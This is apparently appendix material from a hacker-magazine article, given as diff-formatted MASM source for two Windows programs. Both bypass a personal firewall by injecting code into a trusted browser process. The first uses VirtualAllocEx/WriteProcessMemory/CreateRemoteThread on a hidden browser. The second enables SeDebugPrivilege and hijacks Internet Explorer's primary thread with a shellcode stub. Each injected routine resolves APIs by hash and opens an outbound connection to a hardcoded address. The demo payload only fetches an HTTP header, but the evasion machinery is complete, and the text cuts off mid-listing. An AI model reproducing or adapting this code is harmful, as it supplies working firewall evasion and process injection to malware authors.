@@ -1,0 +1,1224 @@
+-[0x0B] :: injector.exe source code --------------------------------------
+
+Here you go, this is the injector ASM code. I used Negatory Assembly
+Studio 1.0 to create the executable, a nice freeware IDE for creating
+programs in ASM for Windows (5). It internally uses the MASM Assembler
+and linker, so you might also manage to use the code with MASM only
+(you will be lacking the includes, though).
+
+
+.386
+.MODEL flat, stdcall
+
+  INCLUDE   windows.inc
+  INCLUDE   kernel32.inc
+  INCLUDE   advapi32.inc
+  INCLUDE   user32.inc
+
+
+  bypass    PROTO NEAR STDCALL, browser:DWORD  ; injector function
+  inject    PROTO NEAR STDCALL, iBase:DWORD    ; injected function
+        
+
+;       The PSHS macro is used to push the address of some
+;       structure onto the stack inside the remote process'
+;       address space. iBase contains the address where the
+;       injected code starts. 
+
+PSHS    MACRO  BUFFER
+        MOV    EDX, iBase
+        ADD    EDX, OFFSET BUFFER - inject
+        PUSH   EDX
+        ENDM
+               
+;       The LPROC macro assumes that pGetProcAddress holds
+;       the address of the GetProcAddress() API call and
+;       simulates its behaviour. PROCNAME is a string inside
+;       the injected code that holds the function name and
+;       PROCADDR is a DWORD variable inside the injected
+;       code that will retrieve the address of that function.
+;       BASEDLL, as the name suggests, should hold the 
+;       base address of the appropriate DLL.
+         
+LPROC   MACRO  BASEDLL, PROCNAME, PROCADDR
+        PSHS   PROCNAME
+        PUSH   BASEDLL
+        CALL   pGetProcAddress
+        EJUMP  INJECT_ERROR
+        MOV    PROCADDR, EAX
+        ENDM
+
+EJUMP   MACRO  TARGET_CODE ; jump when EAX is 0.
+        CMP    EAX, 0
+        JE     TARGET_CODE
+        ENDM        
+            
+
+.DATA
+
+        sFail               DB  "Injection failed.",0
+        sCapFail            DB  "Failure",0
+
+        REG_BROWSER_SUBKEY  DB  "htmlfile\shell\open\command",0
+        REG_BROWSER_KEY     DD  ?
+        
+        BROWSER             DB  MAX_PATH DUP(0)
+        BR_SIZE             DD  MAX_PATH
+
+        FUNCSZE             EQU inject_end - inject
+          
+.CODE
+
+
+Main:   ; We retrieve the defaul browser path from the
+        ; registry by querying HKCR\htmlfile\shell\open\command
+
+
+        INVOKE  RegOpenKey, HKEY_CLASSES_ROOT, \
+                ADDR REG_BROWSER_SUBKEY, ADDR REG_BROWSER_KEY
+
+        CMP     EAX, ERROR_SUCCESS
+        JNE     RR
+        
+        INVOKE  RegQueryValue, REG_BROWSER_KEY, \
+                EAX, ADDR BROWSER, ADDR BR_SIZE
+
+        INVOKE  RegCloseKey, REG_BROWSER_KEY
+
+
+        ; Now we call the bypass function by supplying the
+        ; path to the browser as the first argument.
+        
+        INVOKE  bypass, OFFSET BROWSER
+
+
+RR:     INVOKE  ExitProcess, 0
+    
+ 
+    
+bypass  PROC NEAR STDCALL, browser:DWORD
+
+        LOCAL   sinf                 :STARTUPINFO
+        LOCAL   pinf                 :PROCESS_INFORMATION
+        
+        LOCAL   dwReturn             :DWORD ; return value
+        LOCAL   dwRemoteThreadID     :DWORD ; thread ID
+        LOCAL   thRemoteThreadHandle :DWORD ; thread handle
+        LOCAL   pbRemoteMemory       :DWORD ; base address 
+
+
+        ; Get our own startupinfo details out of lazieness
+        ; and alter the wShowWindow attribute to SW_HIDE
+
+        INVOKE  GetStartupInfo,ADDR sinf
+        MOV     sinf.wShowWindow, SW_HIDE
+
+        
+        ; Create the brwoser process and WaitForinputIdle()
+        ; to give it some time for initialization
+
+        INVOKE  CreateProcess,0,browser,0,0,0,0,0,0, \
+                ADDR sinf,ADDR pinf                        
+        EJUMP   ERR_CLEAN
+                        
+        INVOKE  WaitForInputIdle, pinf.hProcess, 10000
+        CMP     EAX,0
+        JNE     ERR_CLEAN
+        
+        MOV     EBX, pinf.hProcess
+        MOV     ECX, pinf.hThread
+
+
+        ; Allocate memory in the remote process' address
+        ; space and use WriteProcessMemory() to copy the
+        ; code of the inject procedure.
+        
+        MOV     EDX, FUNCSZE
+        INVOKE  VirtualAllocEx,EBX,0,EDX,MEM_COMMIT, \
+                PAGE_EXECUTE_READWRITE
+        EJUMP   ERR_SUCC
+        
+        MOV     pbRemoteMemory,EAX
+        MOV     EDX,FUNCSZE        
+        
+        INVOKE  WriteProcessMemory,EBX,pbRemoteMemory, \
+                inject, EDX, 0
+        EJUMP   ERR_CLEAN_VF
+        
+
+        ; The code has been copied, create a thread that
+        ; starts at the remote address
+
+        INVOKE  CreateRemoteThread,EBX,0,0,pbRemoteMemory, \
+                pbRemoteMemory, 0, ADDR dwRemoteThreadID        
+        EJUMP   ERR_CLEAN_TH
+        
+        MOV     thRemoteThreadHandle,EAX
+        MOV     dwReturn,0
+
+
+        ; Wait until the remote thread terminates and see what the
+        ; return value looks like. The inject procedure will return
+        ; a boolean value in EAX, indicating whether or not it was
+        ; successful.
+        
+        INVOKE  WaitForSingleObject,thRemoteThreadHandle,INFINITE
+        INVOKE  GetExitCodeThread,thRemoteThreadHandle,ADDR dwReturn
+        
+        ; If the return value equals 0, an error has occured and we
+        ; will display a failure MessageBox() 
+
+        CMP     dwReturn, 0
+        JNE     ERR_CLEAN_TH
+ 
+        INVOKE  MessageBox, 0, OFFSET sFail, OFFSET sCapFail, 16
+        
+ERR_CLEAN_TH:
+        INVOKE  CloseHandle,thRemoteThreadHandle
+ERR_CLEAN_VF:
+        INVOKE  VirtualFreeEx, EBX, pbRemoteMemory, 0, MEM_RELEASE
+ERR_CLEAN:
+        INVOKE  TerminateProcess, EBX, 0
+        INVOKE  CloseHandle,pinf.hThread
+        INVOKE  CloseHandle,pinf.hProcess
+ERR_SUCC:
+        RET
+
+bypass  ENDP 
+
+
+
+inject  PROC NEAR STDCALL, iBase:DWORD
+
+        LOCAL k32base          :DWORD
+        LOCAL expbase          :DWORD
+        LOCAL forwards         :DWORD
+                        
+        LOCAL pGetProcAddress  :DWORD
+        LOCAL pGetModuleHandle :DWORD
+        LOCAL pLoadLibrary     :DWORD
+        LOCAL pFreeLibrary     :DWORD
+                        
+        LOCAL pMessageBox      :DWORD
+        LOCAL u32base          :DWORD
+        LOCAL ws32base         :DWORD
+                        
+        LOCAL pWSAStartup      :DWORD
+        LOCAL pWSACleanup      :DWORD
+        
+        LOCAL pSocket          :DWORD
+        LOCAL pConnect         :DWORD
+        LOCAL pSend            :DWORD
+        LOCAL pRecv            :DWORD
+        LOCAL pClose           :DWORD
+                        
+        JMP IG
+
+
+        sGetModuleHandle DB "GetModuleHandleA" ,0
+        sLoadLibrary     DB "LoadLibraryA"     ,0
+        sFreeLibrary     DB "FreeLibrary"      ,0
+                        
+        sUser32          DB "USER32.DLL"       ,0
+        sMessageBox      DB "MessageBoxA"      ,0
+                        
+        sGLA             DB "GetLastError"     ,0
+        sWLA             DB "WSAGetLastError"  ,0
+                        
+        sWS2_32          DB "ws2_32.dll"       ,0
+        sWSAStartup      DB "WSAStartup"       ,0
+        sWSACleanup      DB "WSACleanup"       ,0
+        sSocket          DB "socket"           ,0
+        sConnect         DB "connect"          ,0
+        sSend            DB "send"             ,0
+        sRecv            DB "recv"             ,0
+        sClose           DB "closesocket"      ,0
+
+        wsa LABEL BYTE
+         wVersion        DW 0
+         wHighVersion    DW 0
+         szDescription   DB WSADESCRIPTION_LEN+1 DUP(0)
+         szSystemStatus  DB WSASYS_STATUS_LEN+1 DUP(0)
+         iMaxSockets     DW 0
+         iMaxUdpDg       DW 0
+         lpVendorInfo    DD 0
+                        
+        sAddr LABEL BYTE
+         sin_family      DW AF_INET
+         sin_port        DW 05000H
+         sin_addr        DD 006EE3745H
+         sin_zero        DQ 0
+                        
+
+                
+        sStartC          DB "SetUp Complete",0
+        sStart           DB "Injector SetUp complete. ", \
+                            "Sending request:",13,10,13,10
+                
+        sRequ            DB "GET / HTTP/1.0",13,10, \
+                            "Host: www.phrack.org",\
+                            13,10,13,10,0
+                        
+        sCap             DB "Injection successful",0
+        sRepl            DB 601 DUP(0)
+
+                  
+IG:     ASSUME  FS:NOTHING           ; This is a MASM error bypass.      
+
+        MOV     EAX, FS:[030H]       ; Get the Process Environment Block
+        TEST    EAX, EAX             ; Check for Win9X
+        JS      W9X
+
+WNT:    MOV     EAX, [EAX+00CH]      ; WinNT: get PROCESS_MODULE_INFO
+        MOV     ESI, [EAX+01CH]      ; Get fLink from ordered module list
+        LODSD                        ; Load the address of bLink into eax
+        MOV     EAX, [EAX+008H]      ; Copy the module base from the list
+        JMP     K32                  ; Work done
+
+W9X:    MOV     EAX, [EAX+034H]      ; Undocumented offset (0x34)
+        LEA     EAX, [EAX+07CH]      ; ...
+        MOV     EAX, [EAX+03CH]      ; ...
+K32:    MOV     k32base,EAX          ; Keep a copy of the base address
+        MOV     pGetProcAddress, 0   ; now search for GetProcAddress
+        MOV     forwards,0           ; Set the forwards to 0 initially
+
+        MOV     pWSACleanup, 0       ; we will need these for error -
+        MOV     ws32base, 0          ; checks lateron
+
+        ADD     EAX,[EAX+03CH]       ; pointer to IMAGE_NT_HEADERS
+        MOV     EAX,[EAX+078H]       ; RVA of exports directory
+        ADD     EAX,k32base          ; since RVA: add the base address
+        MOV     expbase,EAX          ; IMAGE_EXPORTS_DIRECTORY
+                        
+        MOV     EAX,[EAX+020H]       ; RVA of the AddressOfNames array
+        ADD     EAX,k32base          ; add the base address
+                        
+        MOV     ECX,[EAX]            ; ECX: RVA of the first string
+        ADD     ECX,k32base          ; add the base address
+        
+        MOV     EAX,0                ; EAX will serve as a counter
+        JMP     M2                   ; start looping
+
+M1:     INC     EAX                  ; Increase EAX every loop
+M2:     MOV     EBX, 0               ; EBX will be the calculated hash
+
+HASH:   MOV     EDX, EBX
+        SHL     EBX, 05H
+        SHR     EDX, 01BH
+        OR      EBX, EDX
+        MOV     EDX, 0
+        MOV      DL, [ECX]           ; Copy current character to DL
+        ADD     EBX, EDX             ; and add DL to the hash value
+        INC     ECX                  ; increase the string pointer
+        MOV      DL, [ECX]           ; next character in DL, now:
+        CMP     EDX, 0               ; check for null character
+        JNE     HASH
+
+
+        ; This is where we take care of the forwarders.
+        ; we will always subtract the number of forwarders
+        ; that already occured from our iterator (EAX) to
+        ; retrieve the appropriate offset from the second
+        ; array. 
+
+        PUSH    EAX                  ; Safe EAX to the stack
+        SUB     EAX,forwards         ; Subtract forwards
+        IMUL    EAX,4                ; addresses are DWORD's
+        INC     ECX                  ; Move the ECX pointer to the
+                                     ; beginning of the next name
+
+        MOV     EDX, expbase         ; Load exports directory
+        MOV     EDX, [EDX+01CH]      ; EDX: array of entry points
+        ADD     EDX, k32base         ; add the base address
+        MOV     EDX, [EDX+EAX]       ; Lookup the Function RVA
+        ADD     EDX, k32base         ; add the base address
+        MOV     pGetProcAddress, EDX ; This will be correct once
+                                     ; the loop is finished.
+
+        ; Second stage of our forwarder check: If the 
+        ; "entry point" of this function points to the
+        ; next string in array #1, we just found a forwarder.
+ 
+        CMP     EDX, ECX             ; forwarder check
+        JNE     FWD                  ; ignore normal entry points
+        INC     forwards             ; This was a forwarder
+
+FWD:    POP     EAX                  ; Restore EAX iterator
+        CMP     EBX, 099C95590H      ; hash value for "GetProcAddress"
+        JNE     M1
+
+        ; We have everything we wanted. I use a simple macro
+        ; to load the functions by applying pGetProcAddress.
+
+        LPROC   k32base, sGetModuleHandle, pGetModuleHandle
+        LPROC   k32base, sLoadLibrary, pLoadLibrary
+        LPROC   k32base, sFreeLibrary, pFreeLibrary
+
+
+        PSHS    sUser32              ; we need user32.dll
+        CALL    pGetModuleHandle     ; assume it is already loaded
+        EJUMP   INJECT_ERROR         ; (we could use LoadLibrary)
+        MOV     u32base,EAX          ; got it
+
+        PSHS    sWS2_32              ; most important: winsock DLL
+        CALL    pLoadLibrary         ; LoadLibrary("ws2_32.dll");
+        EJUMP   INJECT_ERROR
+        MOV     ws32base, EAX
+
+
+        LPROC   u32base,sMessageBox,pMessageBox
+        LPROC   ws32base,sWSAStartup,pWSAStartup
+        LPROC   ws32base,sWSACleanup,pWSACleanup
+        LPROC   ws32base,sSocket,pSocket
+        LPROC   ws32base,sConnect,pConnect
+        LPROC   ws32base,sSend,pSend
+        LPROC   ws32base,sRecv,pRecv
+        LPROC   ws32base,sClose,pClose
+
+        PSHS   wsa                   ; see our artificial data segment
+        PUSH   2                     ; Version 2 is fine
+        CALL   pWSAStartup           ; Do the WSAStartup()
+        CMP    EAX, 0
+        JNE    INJECT_ERROR
+
+        PUSH   0
+        PUSH   SOCK_STREAM           ; A normal stream oriented socket
+        PUSH   AF_INET               ; for Internet connections.
+        CALL   pSocket               ; Create it.
+        CMP    EAX, INVALID_SOCKET
+        JE     INJECT_ERROR
+        MOV    EBX,EAX
+
+        PUSH   SIZEOF sockaddr       ; Connect to www.phrack.org:80
+        PSHS   sAddr                 ; hardcoded structure
+        PUSH   EBX                   ; that's our socket descriptor
+        CALL   pConnect              ; connect() to phrack.org
+        CMP    EAX, SOCKET_ERROR
+        JE     INJECT_ERROR
+
+        PUSH   0                     ; no flags
+        PUSH   028H                  ; 40 bytes to send
+        PSHS   sRequ                 ; the GET string
+        PUSH   EBX                   ; socket descriptor
+        CALL   pSend                 ; send() HTTP request
+        CMP    EAX, SOCKET_ERROR
+        JE     INJECT_ERROR
+
+
+        ; We now have to receive the server's reply. We only
+        ; want the HTTP header to display it in a message box
+        ; as an indicator for a successful bypass. 
+ 
+
+        MOV    ECX, 0                ; number of bytes received
+
+PP:     MOV    EDX, iBase 
+        ADD    EDX, OFFSET sRepl-inject
+
+        ADD    EDX, ECX              ; EDX is the current position inside
+                                     ; the string buffer
+        PUSH   EDX
+        PUSH   ECX
+
+        PUSH   0                     ; no flags
+        PUSH   1                     ; one byte to receive
+        PUSH   EDX                   ; string buffer
+        PUSH   EBX                   ; socket descriptor
+        CALL   pRecv                 ; recv() the byte      
+
+        POP    ECX
+        POP    EDX
+
+        CMP    AL, 1                 ; one byte received ?
+        JNE    PPE                   ; an error occured
+        CMP    ECX,2                 ; check if we already received
+        JS     PP2                   ; more than 2 bytes
+
+        MOV    AL, [EDX]             ; this is the byte we got
+        CMP    AL, [EDX-2]           ; we are looking for <CRLF><CRLF>
+        JNE    PP2
+        CMP    AL, 10                ; we found it, most probably.
+        JE     PPE                   ; we only want the headers.
+        
+PP2:    INC    ECX
+        CMP    ECX,600               ; 600 byte maximum buffer size
+        JNE    PP
+
+
+PPE:    PUSH   EBX                   ; socket descriptor
+        CALL   pClose                ; close the socket
+
+        PUSH   64                    ; neat info icon and an ok button
+        PSHS   sCap                  ; the caption string
+        PSHS   sRepl                 ; www.phrack.org's HTTP header
+        PUSH   0                     
+        CALL   pMessageBox           ; display the message box.
+
+        JMP    INJECT_SUCCESS        ; we were successful.
+
+INJECT_SUCCESS:
+        MOV    EAX, 1                ; return values are passed in EAX
+        JMP    INJECT_CLEANUP
+ 
+INJECT_ERROR:
+        MOV    EAX, 0                ; boolean return value (success)
+
+INJECT_CLEANUP:
+        PUSH   EAX                   ; save our return value
+        CMP    pWSACleanup,0
+        JE     INJECT_DONE
+        CALL   pWSACleanup           ; perform cleanup
+        CMP    ws32base, 0           ; check if we have loaded ws2_32
+        JE     INJECT_DONE
+        PUSH   ws32base
+        CALL   pFreeLibrary          ; release ws2_32.dll
+
+INJECT_DONE:
+        POP    EAX                   ; retore the return value  
+        RET                          ; and return
+
+inject  ENDP
+
+inject_end: END Main
+
+
+
+
+-[0x0C] :: tiny.exe source code ------------------------------------------
+
+This is the ASM source code for the second bypass program.
+
+.386
+.MODEL flat, stdcall
+
+  INCLUDE   windows.inc
+  INCLUDE   kernel32.inc
+  INCLUDE   advapi32.inc
+
+  bypass    PROTO                     ; Tiny Firewall Bypass
+  inject    PROTO, iBase:DWORD        ; injected function
+  getsvc    PROTO, pProcessInfo:DWORD ; finds running, trusted process
+  getdbg    PROTO                     ; enables the SE_DEBUG privilege
+        
+
+;       The PSHS macro is used to push the address of some
+;       structure onto the stack inside the remote process'
+;       address space. iBase contains the address where the
+;       injected code starts. 
+
+PSHS    MACRO  BUFFER
+        MOV    EDX, iBase
+        ADD    EDX, OFFSET BUFFER - inject
+        PUSH   EDX
+        ENDM
+               
+;       The LPROC macro assumes that pGetProcAddress holds
+;       the address of the GetProcAddress() API call and
+;       simulates its behaviour. PROCNAME is a string inside
+;       the injected code that holds the function name and
+;       PROCADDR is a DWORD variable inside the injected
+;       code that will retrieve the address of that function.
+;       BASEDLL, as the name suggests, should hold the 
+;       base address of the appropriate DLL.
+         
+LPROC   MACRO  BASEDLL, PROCNAME, PROCADDR
+        PSHS   PROCNAME
+        PUSH   BASEDLL
+        CALL   pGetProcAddress
+        EJUMP  INJECT_ERROR
+        MOV    PROCADDR, EAX
+        ENDM
+
+EJUMP   MACRO  TARGET_CODE ; jump when EAX is 0.
+        CMP    EAX, 0
+        JE     TARGET_CODE
+        ENDM        
+            
+
+.DATA
+        ; This is the name of a trusted process to search for.
+        ; If you know what you are doing, you can play with
+        ; if and see whether other applications work with the
+        ; current code (aka hijack primary thread). 
+        ; "OUTLOOK.EXE" works as well btw.
+       
+        TRUSTED      DB  "IEXPLORE.EXE",0
+        
+        
+        SE_DEBUG     DB  "SeDebugPrivilege",0  ; debug privilege
+        IEV_NAME     DB  "TINY0",0             ; our event name
+        IEV_HANDLE   DD  ?                     ; event handle        
+        FUNCSZE      EQU iend-istart           ; inject's size
+        CODESZE      EQU 19                    ; size of our "shellcode"
+        ALLSZE       EQU FUNCSZE + CODESZE     ; complete size
+        FUNCADDR     EQU istart                ; offset of inject        
+        
+        ; JUMPDIFF is the number of bytes from the beginning of
+        ; the shellcode to the jump instruction. It is required
+        ; to calculate the value of JUMP_ADDR, see below.
+        
+        JUMPDIFF       EQU 14
+        
+
+        ; This "shellcode" will be injected to the trusted
+        ; process directly in fron of the injector procedure
+        ; itself. It will simply call the injector function
+        ; with its base address as the first argument and
+        ; jump back to the address where we hijacked the 
+        ; thread afterwards. The addresses of our injected
+        ; function (PUSH_ADDR) and the original EIP of the
+        ; hijacked thread (JUMP_ADDR) will be calculated 
+        ; at runtime, of course.
+        
+        SHELLCODE    LABEL BYTE
+        
+         PUSHAD_CODE DB 060H ; PUSHAD
+         PUSHFD_CODE DB 09CH ; PUSHFD
+         PUSH_CODE   DB 068H ; PUSH <function address>
+         PUSH_ADDR   DD ?
+         CALL_CODE   DB 0E8H ; CALL <function address>
+         CALL_ADDR   DD 07H
+         POPFD_CODE  DB 09DH ; POPFD
+         POPAD_CODE  DB 061H ; POPAD
+         JUMP_CODE   DB 0E9H ; JUMP <original EIP>
+         JUMP_ADDR   DD ?
+                             ; <injector function>
+                             ; ...        
+ 
+.CODE
+
+
+Main: ; not much to do except calling
+      ; the bypass function in this sample.
+      
+        INVOKE  bypass
+        INVOKE  ExitProcess, 0
+
+
+getdbg  PROC  ; enables the SE_DEBUG privilege for ourself
+        LOCAL   token:HANDLE
+        LOCAL   priv:TOKEN_PRIVILEGES 
+        LOCAL   luid:LUID
+        INVOKE  LookupPrivilegeValue, 0,OFFSET SE_DEBUG, ADDR luid
+        EJUMP   DBE0
+        MOV     priv.PrivilegeCount, 01H
+        MOV     priv.Privileges.Attributes, 02H
+        MOV     EAX,luid.LowPart
+        MOV     priv.Privileges.Luid.LowPart,EAX
+        MOV     EAX,luid.HighPart
+        MOV     priv.Privileges.Luid.HighPart,EAX
+        INVOKE  GetCurrentProcess
+        MOV     ECX,EAX
+        INVOKE  OpenProcessToken,ECX,020H, ADDR token
+        MOV     ECX, token
+        CMP     ECX, 0
+        JE      DBE0
+        INVOKE  AdjustTokenPrivileges,ECX,0,ADDR priv,0,0,0
+        MOV     ECX,EAX
+        INVOKE  CloseHandle, token
+        MOV     EAX,ECX
+DBE0:   RET
+getdbg  ENDP
+
+
+
+getsvc  PROC,   pProcessInfo:DWORD
+
+        ; This function fills a PROCESS_INFORMATION
+        ; structure with the ID and handle of the
+        ; required trusted process and its primary
+        ; thread. The tool helper API is used to
+        ; retrieve this information.
+
+        LOCAL   p32:PROCESSENTRY32
+        LOCAL   t32:THREADENTRY32
+        
+        LOCAL   hShot:DWORD
+        
+        MOV     p32.dwSize, SIZEOF PROCESSENTRY32
+        MOV     t32.dwSize, SIZEOF THREADENTRY32
+        
+        INVOKE  getdbg ; we need SE_DEBUG first
+        
+        ; Create a snapshot of all processes and
+        ; threads. 06H is the appropriate bitmask
+        ; for this purpose, look it up if you 
+        ; dont trust me.
+        
+        INVOKE  CreateToolhelp32Snapshot,06H,0
+        MOV     hShot,EAX
+        
+        ; Start to search for the trusted process.
+        ; We will compare the name of the process'
+        ; primary module with the string buffer
+        ; TRUSTED until we find a match.
+        
+        INVOKE  Process32First, hShot, ADDR p32
+        CMP     EAX, 0
+        JE      GSE1
+
+GSL:    LEA     EDX, p32.szExeFile
+        INVOKE  lstrcmpi, EDX, OFFSET TRUSTED
+        
+        CMP     EAX, 0 ; lstrcmpi is not case sensitive!
+        JE      GSL1   ; good, we found the process
+        
+        INVOKE  Process32Next, hShot, ADDR p32
+        
+        CMP     EAX, 0 ; no more processes,
+        JE      GSE1   ; no success
+        JMP     GSL    ; otherwise, continue loop
+        
+        ; We have found an instance of the trusted
+        ; process, continue to retrieve information
+        ; about its primary thread and gain an open
+        ; handle to both the process itself and the
+        ; thread. To find the thread, we have to
+        ; loop through all thread entries in our 
+        ; snapshot until we discover a thread that
+        ; has been created by the process we found.
+        
+GSL1:   INVOKE  Thread32First, hShot, ADDR t32
+        MOV     EBX, 0
+
+TSL:    MOV     EDX, t32.th32OwnerProcessID
+        CMP     EDX, p32.th32ProcessID
+        JE      TSL0
+        INVOKE  Thread32Next, hShot, ADDR t32
+        CMP     EAX, 0 ; no more threads (weird),
+        JE      GSE1   ; no success 
+        JMP     TSL    ; otherwise, continue loop
+        
+        ; Now, since we have got the ID's of both
+        ; the process itself and the primary thread,
+        ; use OpenProcess() and OpenThread() to 
+        ; get a handle to both of them. You are right,
+        ; OpenThread is NOT a documented call, but
+        ; it looks like that was rather an accident.
+        ; It is exported by kernel32.dll just like
+        ; OpenProcess().
+        
+TSL0:   MOV     EDX, pProcessInfo     ; the structure address
+
+        MOV     EAX,p32.th32ProcessID ; copy the process ID
+        MOV     [EDX+08H], EAX
+        
+        MOV     EAX, t32.th32ThreadID ; copy the thread ID
+        MOV     [EDX+0CH], EAX
+        
+        PUSH    EDX                   ; safe the address
+        
+        
+        INVOKE  OpenProcess, PROCESS_ALL_ACCESS, \
+                0, p32.th32ProcessID
+                
+        CMP     EAX, 0
+        JE      GSE1
+        MOV     EBX, EAX
+        
+        INVOKE  OpenThread, THREAD_ALL_ACCESS, 0, \
+                t32.th32ThreadID
+                
+        CMP     EAX, 0
+        JE      GSE1
+        
+        POP     EDX                   ; restore the address
+        MOV     [EDX], EBX            ; copy the process handle
+        MOV     [EDX+04H], EAX        ; copy the thread handle
+        
+        PUSH    1                     ; success
+        JMP     GSE0                   
+           
+GSE1:   PUSH    0                     ; failure
+
+GSE0:   CMP     hShot, 0
+        JE      GSE
+        INVOKE  CloseHandle, hShot    ; cleanup
+
+GSE:    POP     EAX                   ; pop the return value to EAX
+        RET                           ; that's it.
+        
+getsvc  ENDP 
+
+ 
+
+istart:
+
+inject  PROC, iBase:DWORD
+
+
+        LOCAL k32base          :DWORD
+        LOCAL expbase          :DWORD
+        LOCAL forwards         :DWORD
+                        
+        LOCAL pGetProcAddress  :DWORD
+        LOCAL pGetModuleHandle :DWORD
+        LOCAL pLoadLibrary     :DWORD
+        LOCAL pFreeLibrary     :DWORD
+        
+        LOCAL pOpenEvent       :DWORD
+        LOCAL pCloseHandle     :DWORD
+        LOCAL pSetEvent        :DWORD
+             
+        LOCAL pMessageBox      :DWORD
+        LOCAL u32base          :DWORD
+        LOCAL ws32base         :DWORD
+                        
+        LOCAL pWSAStartup      :DWORD
+        LOCAL pWSACleanup      :DWORD
+        
+        LOCAL pSocket          :DWORD
+        LOCAL pConnect         :DWORD
+        LOCAL pSend            :DWORD
+        LOCAL pRecv            :DWORD
+        LOCAL pClose           :DWORD
+                        
+        JMP IG
+
+
+        sGetModuleHandle DB "GetModuleHandleA" ,0
+        sLoadLibrary     DB "LoadLibraryA"     ,0
+        sFreeLibrary     DB "FreeLibrary"      ,0
+        
+        sOpenEvent       DB "OpenEventA"       ,0
+        sCloseHandle     DB "CloseHandle"      ,0
+        sSetEvent        DB "SetEvent"         ,0
+        sFWPEVENT        DB "TINY0"            ,0
+                        
+        sUser32          DB "USER32.DLL"       ,0
+        sMessageBox      DB "MessageBoxA"      ,0
+                        
+        sGLA             DB "GetLastError"     ,0
+        sWLA             DB "WSAGetLastError"  ,0
+                        
+        sWS2_32          DB "ws2_32.dll"       ,0
+        sWSAStartup      DB "WSAStartup"       ,0
+        sWSACleanup      DB "WSACleanup"       ,0
+        sSocket          DB "socket"           ,0
+        sConnect         DB "connect"          ,0
+        sSend            DB "send"             ,0
+        sRecv            DB "recv"             ,0
+        sClose           DB "closesocket"      ,0
+
+        wsa LABEL BYTE
+         wVersion        DW 0
+         wHighVersion    DW 0
+         szDescription   DB WSADESCRIPTION_LEN+1 DUP(0)
+         szSystemStatus  DB WSASYS_STATUS_LEN+1 DUP(0)
+         iMaxSockets     DW 0
+         iMaxUdpDg       DW 0
+         lpVendorInfo    DD 0
+                        
+        sAddr LABEL BYTE
+         sin_family      DW AF_INET
+         sin_port        DW 05000H
+         sin_addr        DD 006EE3745H
+         sin_zero        DQ 0
+                        
+
+                
+        sStartC          DB "SetUp Complete",0
+        sStart           DB "Injector SetUp complete. ", \
+                            "Sending request:",13,10,13,10
+                
+        sRequ            DB "GET / HTTP/1.0",13,10, \
+                            "Host: www.phrack.org",\
+                            13,10,13,10,0
+                        
+        sCap             DB "Injection successful",0
+        sRepl            DB 601 DUP(0)
+
+                  
+IG:     ASSUME  FS:NOTHING           ; This is a MASM error bypass.      
+
+        MOV     EAX, FS:[030H]       ; Get the Process Environment Block
+        TEST    EAX, EAX             ; Check for Win9X
+        JS      W9X
+
+WNT:    MOV     EAX, [EAX+00CH]      ; WinNT: get PROCESS_MODULE_INFO
+        MOV     ESI, [EAX+01CH]      ; Get fLink from ordered module list
+        LODSD                        ; Load the address of bLink into eax
+        MOV     EAX, [EAX+008H]      ; Copy the module base from the list
+        JMP     K32                  ; Work done
+
+W9X:    MOV     EAX, [EAX+034H]      ; Undocumented offset (0x34)
+        LEA     EAX, [EAX+07CH]      ; ...
+        MOV     EAX, [EAX+03CH]      ; ...
+K32:    MOV     k32base,EAX          ; Keep a copy of the base address
+        MOV     pGetProcAddress, 0   ; now search for GetProcAddress
+        MOV     forwards,0           ; Set the forwards to 0 initially
+        
+        MOV     pWSACleanup, 0       ; we will need these for error -
+        MOV     ws32base, 0          ; checks lateron
+        MOV     pOpenEvent, 0
+
+        ADD     EAX,[EAX+03CH]       ; pointer to IMAGE_NT_HEADERS
+        MOV     EAX,[EAX+078H]       ; RVA of exports directory
+        ADD     EAX,k32base          ; since RVA: add the base address
+        MOV     expbase,EAX          ; IMAGE_EXPORTS_DIRECTORY
+                        
+        MOV     EAX,[EAX+020H]       ; RVA of the AddressOfNames array
+        ADD     EAX,k32base          ; add the base address
+                        
+        MOV     ECX,[EAX]            ; ECX: RVA of the first string
+        ADD     ECX,k32base          ; add the base address
+        
+        MOV     EAX,0                ; EAX will serve as a counter
+        JMP     M2                   ; start looping
+
+M1:     INC     EAX                  ; Increase EAX every loop
+M2:     MOV     EBX, 0               ; EBX will be the calculated hash
+
+HASH:   MOV     EDX, EBX
+        SHL     EBX, 05H
+        SHR     EDX, 01BH
+        OR      EBX, EDX
+        MOV     EDX, 0
+        MOV      DL, [ECX]           ; Copy current character to DL
+        ADD     EBX, EDX             ; and add DL to the hash value
+        INC     ECX                  ; increase the string pointer
+        MOV      DL, [ECX]           ; next character in DL, now:
+        CMP     EDX, 0               ; check for null character
+        JNE     HASH
+
+
+        ; This is where we take care of the forwarders.
+        ; we will always subtract the number of forwarders
+        ; that already occured from our iterator (EAX) to
+        ; retrieve the appropriate offset from the second
+        ; array. 
+
+        PUSH    EAX                  ; Safe EAX to the stack
+        SUB     EAX,forwards         ; Subtract forwards
+        IMUL    EAX,4                ; addresses are DWORD's
+        INC     ECX                  ; Move the ECX pointer to the
+                                     ; beginning of the next name
+
+        MOV     EDX, expbase         ; Load exports directory
+        MOV     EDX, [EDX+01CH]      ; EDX: array of entry points
+        ADD     EDX, k32base         ; add the base address
+        MOV     EDX, [EDX+EAX]       ; Lookup the Function RVA
+        ADD     EDX, k32base         ; add the base address
+        MOV     pGetProcAddress, EDX ; This will be correct once
+                                     ; the loop is finished.
+
+        ; Second stage of our forwarder check: If the 
+        ; "entry point" of this function points to the
+        ; next string in array #1, we just found a forwarder.
+ 
+        CMP     EDX, ECX             ; forwarder check
+        JNE     FWD                  ; ignore normal entry points
+        INC     forwards             ; This was a forwarder
+
+FWD:    POP     EAX                  ; Restore EAX iterator
+        CMP     EBX, 099C95590H      ; hash value for "GetProcAddress"
+        JNE     M1
+
+        ; We have everything we wanted. I use a simple macro
+        ; to load the functions by applying pGetProcAddress.
+
+        LPROC   k32base, sGetModuleHandle, pGetModuleHandle
+        LPROC   k32base, sLoadLibrary, pLoadLibrary
+        LPROC   k32base, sFreeLibrary, pFreeLibrary
+        
+        LPROC   k32base, sOpenEvent, pOpenEvent
+        LPROC   k32base, sCloseHandle, pCloseHandle
+        LPROC   k32base, sSetEvent, pSetEvent
+
+
+        PSHS    sUser32              ; we need user32.dll
+        CALL    pGetModuleHandle     ; assume it is already loaded
+        EJUMP   INJECT_ERROR         ; (we could use LoadLibrary)
+        MOV     u32base,EAX          ; got it
+
+        PSHS    sWS2_32              ; most important: winsock DLL
+        CALL    pLoadLibrary         ; LoadLibrary("ws2_32.dll");
+        EJUMP   INJECT_ERROR
